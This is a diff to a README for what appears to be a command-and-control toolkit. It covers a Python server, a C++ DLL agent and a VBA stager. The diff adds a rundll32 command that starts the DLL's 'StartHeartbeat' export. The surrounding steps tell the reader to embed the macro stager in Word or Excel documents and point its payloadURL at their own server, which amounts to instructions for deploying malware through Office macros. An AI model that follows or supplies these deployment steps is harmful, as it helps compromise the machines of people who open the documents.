@@ -42,9 +42,14 @@ Run the server:
 python server.py
 ```
 
+
 ### 2. Compile the Talon (Agent)
 Compile the C++ code as a **Dynamic Link Library (DLL)**. Ensure you link the ``winhttp.lib`` and ``ws2_32.lib`` libraries.
 
+Optional: Run the DLL
+```
+rundll32.exe .\shqiponja.dll,StartHeartbeat
+```
 ### 3. Deploy the Flight (Stager)
 Embed the provided VBA code into a Word or Excel document. Update the ``payloadURL`` to point to your server's IP.
 
